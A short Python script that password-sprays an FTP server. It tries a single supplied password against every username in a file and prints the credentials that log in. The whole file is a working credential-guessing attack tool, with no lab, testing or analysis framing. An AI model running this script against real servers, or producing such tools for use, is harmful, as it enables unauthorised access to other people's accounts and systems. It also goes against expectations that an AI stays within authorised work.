#!/usr/bin/python3
from ftplib import FTP, error_perm
import time
import sys


if len(sys.argv) < 5:
	print(f'Usage: {sys.argv[0]} [target] [port number] [password] [userfile]')
else:
	target = sys.argv[1]
	p = int(sys.argv[2]) # port number
	users_file = sys.argv[4]
	password = sys.argv[3]
	delay = 0.5

	def try_login(user, password):
		try:
			print(f'[*] Trying: {user}:{password}')
			ftp = FTP()
			ftp.connect(target, p, timeout=8)
			ftp.login(user, password)
			print(f"[+] Sucess: {user}:{password}")
			ftp.quit()
			return True
		except error_perm:
			return False
		except Exception as e:
			print(f"[!] Error: {user}:{password} --> ({e})")
		return False

	with open(users_file) as uf:
		users = [u.strip() for u in uf.readlines() if u.strip()]

	for user in users:
		try_login(user, password)
		time.sleep(delay)
